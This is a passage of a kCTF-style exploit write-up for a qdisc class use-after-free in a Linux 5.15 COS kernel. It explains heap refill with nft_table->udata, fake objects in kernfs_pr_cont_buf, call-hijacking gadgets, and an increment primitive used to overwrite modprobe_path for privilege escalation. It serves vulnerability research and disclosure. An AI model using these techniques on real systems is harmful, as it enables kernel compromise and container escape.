First thing is first, I knew from other entries and players that I didn't really have to worry about KASLR as a barrier, because I could always just use the [Entrybleed](https://www.willsroot.io/2022/12/entrybleed.html) side-channel, so I didn't invest any time in trying to think of other ways to defeat KASLR. There was also the possibility that we use the `WARN()` splat from the invalid `list_del` which ends up showing us register values containing heap pointers, our PID (on COS instances we spawn inside a namespace jail and we don't know our real pid), and a kernel text pointer that could be used to defeat KASLR. I thought this was sort of inelegant but never crossed it off my list of possibilities. Luckily I was able to complete the exploit without resorting to this. 

With that settled, I moved onto what we should do to refill the freed class so that we could control what function is called. I identified the [`nft_table->udata`](https://elixir.bootlin.com/linux/v5.15.173/source/include/net/netfilter/nf_tables.h#L1178) field as a nice elastic object that is 100% user-controlled back in around 2023 that could be used as a refill object for kmalloc slab caches up to kmalloc-256, but never got the chance to use it. Kernel devs eventually turned this allocation into a `GFP_KERNEL_ACCOUNT` allocation, so it can't be used any more if the slab caches are separate to replace general kmalloc-128 objects like our class. But on the Google COS instance which runs a 5.15.173+ kernel, the allocation was non-accounted so I decided to use it. 

With this refill object, we can now fake 100% of the UAF class, which is obviously helpful. The problem is that due to the multiple pointer dereferences in the indirect call to `cl->qdisc->ops->peek`, we also need to control data at a *known* location from the kernel base. I first looked for an opportunity to use [RetSpill](https://dl.acm.org/doi/10.1145/3576915.3623220) to smuggle user controlled values into my kernel stack, but we end up in our gadget via a `sendto` syscall which unfortunately doesn't happen to spill any user values onto the kernel stack, at least from what I could tell. Next I settled on using the [`kernfs_pr_cont_buf`](https://elixir.bootlin.com/linux/v5.15.173/source/fs/kernfs/dir.c#L30), which I learned about in the kCTF Discord from [@roddux](https://x.com/roddux). They had read this [writeup](https://github.com/zerozenxlabs/ZDI-24-020) which contained the details. Basically, if your kernel has `CONFIG_NETFILTER_XT_MATCH_CGROUP`, which kCTF instances do, then you can store up to `PATH_MAX` user controlled data a known offset from the kernel base. This is insane actually and makes exploitation so much easier. The best part is the data there is very mutable, you can just keep resetting its contents. You can accomplish this by establishing an `iptables` match rule on a cgroup file path, and the file path gets stored as data in the buffer. The only *catch* is that the buffer is meant to store a path name, thus, any NULL could terminate your data buffer. So this is something I had to account for in my exploit.

Now we seemingly had everything we needed to explore what function to call. We had our fake class which was in `nft_table->udata` and our fake qdisc and its ops table at a known address in `kernfs_pr_cont_buf`. The next thing I wanted to accomplish at this point was to determine what side-effects hijacking execution here brought with it. So I used our function call primitive to just call a `ret` gadget, and see where we end up. We immediately blow up in `drr_dequeue` for a few reasons:
```c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	struct sk_buff *skb;
	unsigned int len;

	if (list_empty(&q->active))
		goto out;
	while (1) {
		cl = list_first_entry(&q->active, struct drr_class, alist);
		skb = cl->qdisc->ops->peek(cl->qdisc);				// [1]
		if (skb == NULL) {
			qdisc_warn_nonwc(__func__, cl->qdisc);
			goto out;
		}

		len = qdisc_pkt_len(skb);					// [2]
		if (len <= cl->deficit) {					// [3]
			cl->deficit -= len;					// [4]
			skb = qdisc_dequeue_peeked(cl->qdisc);			// [5]
			if (unlikely(skb == NULL))
				goto out;					// [6]
			if (cl->qdisc->q.qlen == 0)
				list_del(&cl->alist);

			bstats_update(&cl->bstats, skb);
			qdisc_bstats_update(sch, skb);
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
			return skb;						// [7]
		}

		cl->deficit += cl->quantum;
		list_move_tail(&cl->alist, &q->active);				// [8]
	}
out:
	return NULL;
}
```

Once we call our simple `ret` gadget during our experiment we return to `[1]` where the return value is interpreted as a pointer to a `sk_buff`. This could be a problem for us because whatever gadget we use could do something with the return value that is supposed to be stored in `rax`. In our experiment, our function doesn't touch `rax`, we just return, so `rax` still points to a function address. So it definitely isn't NULL. Since it's not NULL we progress to `[2]`, this ends up being something like a read of `skb` field value, like a `skb->len`, so this will return a value from reading executable text in our case, because `rax` is a function address. At `[3]` we see that if that value it reads from the kernel text is less than or equal to our fake class deficit value, we enter this if statement body at `[4]`. Here, we are actually decrementing a value in our fake class, so this will write to our `nft_table->udata` refill object. That is notable because that is an immutable refill object, once we refill (allocate it) we have no way of resetting/changing its contents. We then see a call to `qdisc_deqeueue_peeked` in `[5]`, which we will get into in a second, and if that returns NULL, we can escape this hell-hole of a function at `[6]`. Separately, if we make it to `[7]`, which would incur several memory accesses to our fake qdisc, we return a non-NULL pointer value. My goal from the start was that if we were to restore execution gracefully and as simply as possible, we would be required to return NULL from this function so that the calling function had nothing to do with the results of our hijacked execution. We can see even more list manipulation at `[8]` so I wanted to avoid this at all costs. 

Let's then go check on the call to `qdisc_dequeue_peeked` which takes a pointer to our fake qdisc as its argument in `[5]`:
```c
/* use instead of qdisc->dequeue() for all qdiscs queried with ->peek() */
static inline struct sk_buff *qdisc_dequeue_peeked(struct Qdisc *sch)
{
	struct sk_buff *skb = skb_peek(&sch->gso_skb);			// [1]

	if (skb) {							// [2]
		skb = __skb_dequeue(&sch->gso_skb);
		if (qdisc_is_percpu_stats(sch)) {
			qdisc_qstats_cpu_backlog_dec(sch, skb);
			qdisc_qstats_cpu_qlen_dec(sch);
		} else {
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
		}
	} else {
		skb = sch->dequeue(sch);				// [3]
	}

	return skb;
}
```

We see that we get a pointer to another `sk_buff` by calling `skb_peek()` on the `gso_skb` field of our fake qdisc. This is good news for us, because that means that this outcome is *probably somewhat* controllable for us since we control the entirety of the fake qdisc. We'll examine `skb_peek()` in a second. If we return a non-NULL socket buffer from `skb_peek`, we then go on to call `__skb_dequeue` with the pointer to `gso_skb` and it goes on to do more list manipulation and memory accesses on the fake qdisc. This looked very unattractive to me compared to yet another indirect function call in `sch->deuque(sch)` which we should be able to again hijack because we control the fake qdisc. So at this point I'm thinking:
1. We hijack execution in two places: once in `drr_dequeue` and once in `qdisc_dequeue_peeked`
2. We can use the first hijacking to do *something useful*
3. We can use the second hijacking to restore execution in some way gracefully

So the first thing I tried was killing my task in the first hijacking spot just to make sure it was possible to do. I tried a few tricks that other players have used and ended up trying use [`do_exit`](https://elixir.bootlin.com/linux/v5.15.173/source/kernel/exit.c#L776) as the way to kill my task which is whatever task I use to send a packet to the loopback interface which triggers the call to `drr_dequeue`. The problem is that I hit this code block:
```c
if (unlikely(in_interrupt()))
		panic("Aiee, killing interrupt handler!");
```

This means that we hijack execution in an interrupt context, likely from the interrupt caused by the loopback interface receiving a packet. So these types of tricks that typically apply to a normal process context don't apply here, and I don't have powerful enough primitives (we're just limimted to two function calls, not a full ROP chain) to remove my task from an interrupt context. So my plan was to just exit the dequeue function normally by returning NULL if possible. 

To see if this is feasible, we need to see where and how we can reach the `sch->dequeue` inside of `qdisc_dequeue_peeked` which is our 2nd hijack spot. We need `skb_peek(&sch->gso_skb)` to return NULL:
```c
static inline struct sk_buff *skb_peek(const struct sk_buff_head *list_)
{
	struct sk_buff *skb = list_->next;

	if (skb == (struct sk_buff *)list_)
		skb = NULL;
	return skb;
}
```

Turns out this is just a simple check to see if a list head element points to itself, indicating that the list is empty. We can actually do this because we control the fake qdisc. So as long as at the offset for `&sch->gso_skb` the value there points its own address, we can return a NULL from this function. That lands us right into `sch->dequeue`, our 2nd hijack spot. Our goal is to have `qdisc_dequeue_peeked` return NULL, so we need this arbitrary function call to return NULL or 0. So now we need two gadgets or function calls:
1. A function call that does something *useful* with our control over `rdi`
2. A function call that simply returns NULL or 0 to restore execution gracefully within `drr_dequeue`

## Gadget Hunting
I assumed finding the 2nd gadget would be easy, a function call that simply returns 0 or NULL; however, it still took me some time to find. The first thought I had was let's just find a function like this:
```c
void function(struct foo *obj) {
	return obj->field;
}
```

This would be easy, we control the entirety of the memory pointed to by `struct foo *` and we can just simply read a field that returns 0. But then I remembered that I can't really have NULL values in my `kernfs_pr_cont_buf` because its interpreted as a path name when it's sent. So I skipped this idea. What would be even better is a function like this:
```c
void function(struct foo *obj) {
	return obj->field->val;
}
```

This would be perfect, we could just have field point to something that is guaranteed to be 0, such as the end of our `kernfs_pr_cont_buf` where a NULL value is no issue. I found just that in this function:
```c
static unsigned int
sch_frag_dst_get_mtu(const struct dst_entry *dst)
{
	return dst->dev->mtu;
}
```

So now we have our "return NULL gadget" and it was time to find our "do something useful gadget". I played around with the idea for a long time of using this first hijack spot to perform an arbitrary free to upgrade our limited class UAF to something more useful, a more generalized UAF. I would need something like this probably:
```c
void function(struct foo *obj) {
	kfree(obj->ptr);
	return;
}
```

I quickly abandoned this idea though because I didn't have a leaked heap pointer to point the `kfree` at, I didn't want to resort to using leaked pointers from our `WARN()` splat because it felt like cheating. So then I became determined to find an arbitrary write gadget. With the arbitrary write gadget, I would be able to overwrite `modprobe_path` to point to a file I control and read the flag from the container host. This has been done in numerous wasy in the kCTF program so I knew it was feasible. Now began the hard work of finding a write gadget. 

## Finding an Arbitrary Write Function
Finding the write function took me a very long time. I was looking for a function that took a single pointer argument and derived a write from its contents, I was looking for something like this:
```c
void function(struct foo *obj) {
	u64 *location = foo->field;
	*location = foo->value;
}
```

This would derive both the "what" and the "where" in the write from `rdi` which we control as our fake qdisc. To start searching I just started thinking about what data structures in the kernel are humongous and often self-contained logic-wise, ie, likely to passed to a function by themselves. I narrowed my search down to the following structure types: socket buffers, files, directory entries, inodes, and a few others. Cycling through these subsystems and grepping for patterns, I eventually found this function:
```c
void clear_nlink(struct inode *inode)
{
	if (inode->i_nlink) {
		inode->__i_nlink = 0;
		atomic_long_inc(&inode->i_sb->s_remove_count);
	}
}
```

This fits our needs perfectly, if a field in the passed in `inode` is not NULL, which we prefer, then increment the value at `inode->i_sb->s_remove_count` as if its a u64 value. An increment is a type of limited write primitive, we're able to target a single byte at a time with this primitive and increment it until it reaches a desired value and then we can move onto the next byte. So my goal became:
1. Use the increment primitive to increment the first character of `/sbin/modprobe` in kernel memory 
2. Use the return NULL hijack to exit gracefully from `drr_dequeue`
3. Send another packet to repeat until `/sbin/modprobe` is overwritten to something we control 

One iteration of this worked perfect, and I was able to check after the iteration and see that `/sbin/modprobe` had become `0sbin/modprobe` in memory. So the concept worked, but now we have other problems, we need to execute this code path dozens of times because we need to do a lot of incrementing. We want `/sbin/modprobe` to become something like `/proc/500/fd/3` where pid 500 is a pid of ours and fd 3 is a privilege escalation script that gets executed when the kernel tries to invoke the `modprobe_path`. 

So let's revisit `drr_dequeue` and identify the spots that cause problems:
```c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	struct sk_buff *skb;
	unsigned int len;

	if (list_empty(&q->active))
		goto out;
	while (1) {
		cl = list_first_entry(&q->active, struct drr_class, alist);
		skb = cl->qdisc->ops->peek(cl->qdisc);				
		if (skb == NULL) {
			qdisc_warn_nonwc(__func__, cl->qdisc);
			goto out;
		}

		len = qdisc_pkt_len(skb);					// [1]
		if (len <= cl->deficit) {					// [2]
			cl->deficit -= len;					// [3]
			skb = qdisc_dequeue_peeked(cl->qdisc);			
			if (unlikely(skb == NULL))
				goto out;					
			if (cl->qdisc->q.qlen == 0)
				list_del(&cl->alist);

			bstats_update(&cl->bstats, skb);
			qdisc_bstats_update(sch, skb);
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
			return skb;						
		}

		cl->deficit += cl->quantum;
		list_move_tail(&cl->alist, &q->active);				
	}
out:
	return NULL;
}
```

To execute this code path over and over, we need to make sure we *always* enter the if statement body. So we always need `len <= cl->deficit` to be true. Remember that `len` is derived from reading a value at some offset in the kernel text next to our arbitrary write gadget address, so we have 0 control over this value that is returned. But we do control `cl->deficit` with our `nft_table->udata`, so we can make sure that is always `0xffffffff`. Awesome, we're good to go. Nope, at `[3]` that value is decremented in place by `len`, so that memory is access and written to. This is a big problem for me, `nft_table->udata` is immutable, I have no way of updating that value to reset it. 

